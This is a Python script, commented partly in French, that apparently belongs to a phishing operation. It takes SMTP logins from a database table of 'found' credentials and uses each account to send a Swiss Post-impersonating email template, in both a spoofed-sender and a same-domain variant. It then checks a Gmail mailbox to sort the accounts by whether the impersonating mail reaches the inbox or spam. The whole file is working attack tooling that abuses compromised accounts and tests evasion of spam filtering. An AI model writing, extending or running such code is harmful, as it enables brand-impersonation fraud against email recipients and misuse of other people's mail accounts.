#!/usr/bin/env python3
"""Classify all SMTP: SPOOF_INBOX / SPOOF_SPAM / BASIQUE_INBOX / BASIQUE_SPAM / FAIL"""
import sys, os, time, sqlite3, uuid
sys.path.insert(0, "/opt/darkvasend")

from auditguard.campaign_sender import send_clean
from auditguard.spoof_templates import get_template
from auditguard.imap_checker import GMAIL_CHECKER, check_gmail_delivery

DB = "/opt/darkvasend/bustgo-hunt.db"
tpl = get_template("swisspost")
checker_email = GMAIL_CHECKER["email"]

db = sqlite3.connect(DB, timeout=10)
db.row_factory = sqlite3.Row
rows = db.execute("SELECT id, smtp_host, smtp_port, smtp_user, smtp_password, context FROM found_creds WHERE auth_ok=1").fetchall()

print(f"CLASSIFICATION IMAP — {len(rows)} SMTP")
print(f"Checker: {checker_email}")
print(f"Template: {tpl['brand']}")
print("=" * 60)

# Phase 1: Send spoof + basique from each SMTP with unique markers
markers = []  # (smtp_id, host, mode, marker)

for r in rows:
    sid = r["id"]
    host = r["smtp_host"]
    port = r["smtp_port"]
    user = r["smtp_user"]
    pwd = r["smtp_password"]
    ctx = (r["context"] or "")

    smtp_config = {
        "host": host, "port": port,
        "username": user, "password": pwd,
        "from_email": user,
    }

    # SPOOF mode
    marker_s = f"CLS-S-{uuid.uuid4().hex[:8]}"
    subject_s = f"{tpl['subject']} [{marker_s}]"
    print(f"[#{sid}] {host} SPOOF...", end=" ", flush=True)
    r1 = send_clean(smtp_config, tpl["from_name"], tpl["from_email"], checker_email,
                     subject_s, tpl["html"], tpl.get("reply_to", ""), None)
    if r1["success"]:
        print("SENT", end=" | ", flush=True)
        markers.append((sid, host, user, "spoof", marker_s, ctx))
    else:
        print(f"FAIL({r1.get('error','')})", end=" | ", flush=True)

    # BASIQUE mode
    domain = user.split("@")[1] if "@" in user else host
    bas_from = "swisspost@" + domain
    marker_b = f"CLS-B-{uuid.uuid4().hex[:8]}"
    subject_b = f"{tpl['subject']} [{marker_b}]"
    print("BASIQUE...", end=" ", flush=True)
    r2 = send_clean(smtp_config, tpl["from_name"], bas_from, checker_email,
                     subject_b, tpl["html"], tpl.get("reply_to", ""), None)
    if r2["success"]:
        print("SENT")
        markers.append((sid, host, user, "basique", marker_b, ctx))
    else:
        print(f"FAIL({r2.get('error','')})")

    time.sleep(0.5)

print(f"\nTotal markers to check: {len(markers)}")
print("Waiting 25s for delivery...", flush=True)
time.sleep(25)

# Phase 2: Check IMAP for each marker
print("\nCHECKING IMAP...")
results = {}  # smtp_id -> {spoof: inbox/spam/not_found, basique: inbox/spam/not_found}

for sid, host, user, mode, marker, ctx in markers:
    delivery = check_gmail_delivery(marker, max_retries=2, retry_delay=5.0)
    print(f"  #{sid} {host} [{mode}] → {delivery}")
    if sid not in results:
        results[sid] = {"host": host, "user": user, "old_ctx": ctx, "spoof": "not_sent", "basique": "not_sent"}
    results[sid][mode] = delivery

# Phase 3: Classify and update DB
print("\n" + "=" * 60)
print("CLASSIFICATION FINALE:")

classifications = {"SPOOF_INBOX": [], "SPOOF_SPAM": [], "BASIQUE_INBOX": [], "BASIQUE_SPAM": [], "FAIL": []}

for sid, info in results.items():
    host = info["host"]
    sp = info["spoof"]
    ba = info["basique"]
    old_ctx = info["old_ctx"]

    # Extract label from old context (after last _)
    label = old_ctx.replace("Manual: ", "") if old_ctx else ""
    # Remove old prefix
    for pfx in ["SPOOF_INBOX_", "SPOOF_SPAM_", "BASIQUE_INBOX_", "BASIQUE_SPAM_", "SPOOF_", "BASIQUE_", "STRIP_"]:
        if label.startswith(pfx):
            label = label[len(pfx):]
            break

    # Classify: best mode wins
    if sp == "inbox":
        cat = "SPOOF_INBOX"
        new_ctx = f"Manual: SPOOF_INBOX_{label}"
    elif sp == "spam":
        cat = "SPOOF_SPAM"
        new_ctx = f"Manual: SPOOF_SPAM_{label}"
    elif ba == "inbox":
        cat = "BASIQUE_INBOX"
        new_ctx = f"Manual: BASIQUE_INBOX_{label}"
    elif ba == "spam":
        cat = "BASIQUE_SPAM"
        new_ctx = f"Manual: BASIQUE_SPAM_{label}"
    else:
        cat = "FAIL"
        new_ctx = old_ctx  # Keep old context

    classifications[cat].append((sid, host, sp, ba))

    # Update DB context
    if cat != "FAIL":
        db.execute("UPDATE found_creds SET context=? WHERE id=?", (new_ctx, sid))
        print(f"  #{sid} {host}: {cat} (spoof={sp}, basique={ba}) → updated")
    else:
        print(f"  #{sid} {host}: FAIL (spoof={sp}, basique={ba}) — not updated")

db.commit()
db.close()

print("\n" + "=" * 60)
print("RESUME:")
for cat, items in classifications.items():
    if items:
        print(f"  {cat}: {len(items)}")
        for sid, host, sp, ba in items:
            print(f"    #{sid} {host} (spoof={sp}, basique={ba})")
print("\nDB UPDATED.")
